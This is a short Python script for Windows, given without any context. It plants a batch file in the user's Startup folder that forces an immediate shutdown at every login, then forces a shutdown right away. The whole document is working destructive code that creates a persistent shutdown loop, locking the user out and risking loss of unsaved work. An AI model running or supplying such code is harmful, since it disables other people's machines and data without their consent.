import os

filename = "shutdown.bat"
command = "shutdown /s /f /t 0\n"

startup_path = os.path.join(
    os.getenv('APPDATA'),
    'Microsoft',
    'Windows',
    'Start Menu',
    'Programs',
    'Startup',
    filename
)

with open(startup_path, 'w') as bat_file:
    bat_file.write(command)

print(f"Shutdown batch file created at:\n{startup_path}")

os.system('shutdown /s /f /t 0')